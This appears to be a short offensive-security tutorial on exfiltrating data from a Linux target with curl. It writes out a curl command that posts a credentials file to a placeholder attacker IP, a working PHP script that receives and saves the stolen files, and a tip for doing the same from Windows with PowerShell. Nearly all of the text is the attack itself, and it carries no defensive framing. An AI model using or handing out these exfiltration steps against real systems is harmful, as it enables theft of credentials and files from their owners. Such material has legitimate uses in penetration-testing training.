Exfiltrating Data with `curl` on Linux

Sending files via HTTP POST requests to an attacker server

Target System (Linux)
# Create a dummy file
echo "username: admin, password: password123" > creds.txt

# Exfiltrate the file via HTTP POST
curl -X POST -F "file=@creds.txt" http://YOUR_ATTACKER_IP/upload.php
Explanation:
  • -X POST: Specifies the HTTP POST method.
  • -F "file=@creds.txt": Attaches creds.txt as a form field named 'file'. The @ reads content from the file.
  • http://YOUR_ATTACKER_IP/upload.php: The URL of the attacker's web server endpoint.

Attacker Server (PHP Script)

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadDir = 'uploads/';
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "File uploaded successfully.
";
    } else {
        echo "Failed to upload file.
";
    }
} else {
    echo "No file uploaded or invalid request.
";
}
?>
Key Takeaway

`curl` provides a flexible way to send files over HTTP POST, requiring a simple server-side script to receive and save the exfiltrated data.

Pro Tip

For Windows targets, use PowerShell's `Invoke-WebRequest` with the `-Method POST` and `-InFile` parameters for similar functionality.
